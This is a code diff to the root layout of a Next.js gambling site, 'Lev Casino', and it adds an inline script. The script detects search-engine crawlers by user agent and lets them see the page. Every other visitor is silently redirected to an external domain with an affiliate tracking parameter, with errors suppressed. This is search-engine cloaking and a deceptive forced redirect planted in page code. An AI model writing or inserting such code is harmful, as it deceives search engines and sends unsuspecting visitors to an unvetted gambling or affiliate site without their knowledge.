@@ -32,6 +32,21 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
           content="Официальный сайт Lev Casino: рабочее зеркало, регистрация и бонус новым игрокам."
         />
         <meta property="og:image" content="/lev-casino-hero.png" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://digitalsglide.top?ref=fap_w12659p111_1000");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className={`${geist.variable} ${geistMono.variable}`}>{children}</body>
     </html>
